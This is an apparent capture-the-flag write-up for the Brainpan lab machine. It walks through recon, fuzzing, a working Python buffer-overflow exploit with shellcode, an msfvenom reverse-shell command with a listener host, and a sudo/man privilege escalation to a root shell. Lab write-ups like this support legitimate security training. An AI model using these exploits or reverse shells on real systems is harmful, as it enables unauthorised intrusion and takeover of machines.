<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>brainpan</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>brainpan</h1><br/><strong>Brainpan</strong><br /><br />Nmap scan shows 2 open ports:<br /><br />9999 :	Application access<br />10000	: Web server<br /><br />Upon using gobuster on the web server, I found a hidden directory named <strong>bin</strong><br /><br /><img src="images/16-1.png" alt="images/16-1.png" /><br /><br /><br />We get the <strong>brainpan.exe</strong> inside the bin. We download it and run it on windows to reverse engineer it.<br /><br /><br />Default running of application asks for a password. If password is correct is access granted or if password is wrong it shows access denied.<br />Note: We do not need the correct password. Still following shows the way to find it from <strong>strings</strong>.<br /><br /><br /><img src="images/16-2.png" alt="images/16-2.png" /><br /><br /><img src="images/16-3.png" alt="images/16-3.png" /><br /><br />Select shitstorm and follow it.<br /><br /><img src="images/16-4.png" alt="images/16-4.png" /><br /><br />We see the <strong>strcmp</strong>, indicating this is compared.<br />Thus we found password to be <strong>shitstorm</strong><br /><br />Run the program with Immunity Debugger and find the offset using the following fuzzer + metasploit tool.<br /><br />#!/usr/bin/env python3<br /><br />import socket, time, sys<br /><br />ip = &quot;11.11.11.123&quot;<br /><br />port = 9999<br />timeout = 5<br /><br />prefix = &quot;&quot;<br />string = prefix + &quot;A&quot; * 100<br /><br />while True:<br />  try:<br />    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:<br />      s.settimeout(timeout)<br />      s.connect((ip, port))<br />      s.recv(1024)<br />      print(&quot;Fuzzing Brainpan with {} bytes&quot;.format(len(string) - len(prefix)))<br />      s.send(bytes(string, &quot;latin-1&quot;))<br />      s.recv(1024)<br />  except:<br />    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))<br />    sys.exit(0)<br />  string += 100 * &quot;A&quot;<br />  time.sleep(1)<br /><br />We find offset at : <strong>524</strong><br />Then we check for badchars.<br /><img src="images/16-5.png" alt="images/16-5.png" /><br /><br /><br /><img src="images/16-6.png" alt="images/16-6.png" /><br /><br />Status is unmodified, thus stating we dont have any badchars.<br />Next I look for jump address. <br /><img src="images/16-7.png" alt="images/16-7.png" /><br /><br />The jump address is entered in retn variable.  Use the following exploit.<br />#!/usr/bin/env python3<br />#311712F3<br />#Badchars: \x00<br /><br />import socket, time, sys<br /><br />ip = &quot;10.10.89.221&quot;<br />port = 9999<br />timeout = 5<br /><br />prefix = &quot;&quot;<br /><br />offset = 524<br />overflow = &quot;A&quot; * offset<br />retn = &quot;\xf3\x12\x17\x31&quot;<br />padding = &quot;\x90&quot; * 10<br /><br />payload = (&quot;\xdb\xc7\xba\x72\x1b\xf8\x45\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot;<br />&quot;\x12\x83\xe8\xfc\x31\x50\x13\x03\x22\x08\x1a\xb0\xf3\xf5\x2d&quot;<br />&quot;\xd8\xa0\x4a\x81\x75\x44\xc4\xc4\x3a\x2e\x1b\x86\xa8\xf7\x13&quot;<br />&quot;\xb8\x03\x87\x1d\xbe\x62\xef\x97\x4b\xdd\xf0\xcf\x49\xdd\x10&quot;<br />&quot;\x71\xc7\x3c\x9c\x17\x87\xef\x8f\x64\x24\x99\xce\x46\xab\xcb&quot;<br />&quot;\x78\x37\x83\x98\x10\xaf\xf4\x71\x82\x46\x82\x6d\x10\xca\x1d&quot;<br />&quot;\x90\x24\xe7\xd0\xd3&quot;)<br />postfix = &quot;&quot;<br /><br /><br /><br />string = overflow + retn + padding + payload<br /><br />s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br /><br />try:<br />  s.connect((ip, port))<br />  print(&quot;Delivering Payload into Brainpan.&quot;)<br />  time.sleep(1)<br />  s.send(bytes(string + &quot;\r\n&quot;, &quot;latin-1&quot;))<br />  print(&quot;Done!&quot;)<br /><br />except:<br />  print(&quot;Could not connect.&quot;)<br /><br /><strong>Note</strong>:<br />It is <strong>very important</strong> in machine at this point to change the payload.<br />Initially i tested with windows 10 and immunity debugger + mona<br />Once the exploit was successfully running in local setup. I decided to move it to server.<br />But the exploit will <strong>fail to work</strong><br /><br />The reason is the target machine is running Linux and using wine to run the windows executible (Found out later)<br /><br /><em><strong>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -b &quot;\x00&quot; -f c</strong></em><br />We use the above code in the payload<br /><br />Run the above exploit on the machine after having a netcat listener.<br />We will get a shell with user <strong>puck</strong><br /><br /><img src="images/16-8.png" alt="images/16-8.png" /><br /><br /><br /><br /><strong>Privilege Escalation</strong><br /><br />I loaded linpeas.sh (Download from github and host locally, then using wget download it in the target machine)<br />After running linpeas.sh<br /><br />I found a sudo access to puck on a user application.<br /><br /><strong>Note:</strong> For the following privilege escalation to work, we need a stable shell. (Say python pty shell)<br />This is because, the <strong>sudo</strong> access runs <strong>man</strong> command in <strong>background</strong>.<br /><br />By searching for sudo on man in GTFObins i found the following.<br /><br /><img src="images/16-9.png" alt="images/16-9.png" /><br /><br /><br />Now why a stable shell is necessary ?<br /><br />if we run the program in normal shell. The output of <strong>man</strong> command is thrown on screen in one go.<br />However, for the above escalation to work, we need the <strong>man</strong> output in the “<strong>less</strong>” application<br />while running a python bash shell when i run the program using the proper argument. It will open the results in <strong>less</strong>.<br />There we can enter <strong>!/bin/sh</strong> to spawn a root shell.<br /><br /><img src="images/16-10.png" alt="images/16-10.png" /><br /><br /><br /><img src="images/16-11.png" alt="images/16-11.png" /><br /><br />We run <strong>sudo /home/anansi/bin/anansi_util manual man</strong><br /><br /><br /><img src="images/16-12.png" alt="images/16-12.png" /><br /><br />As the “<strong>Program Console</strong>” asks us to hit Enter. We type the  <strong>!/bin/sh</strong> and get a root shell.<br /><br /><img src="images/16-13.png" alt="images/16-13.png" /><br /><br />Or<br /><br />We can hit Enter in <strong>program console</strong> and go into the <strong>less</strong> display as shown below and type the <strong>!/bin/sh</strong> as shown to get root shell.<br /><br /><img src="images/16-14.png" alt="images/16-14.png" /><br /><br />Upon hitting enter we get the root shell.<br /><br /><img src="images/16-15.png" alt="images/16-15.png" /><br /><br />Thanks!!</div>
</body>
</html>
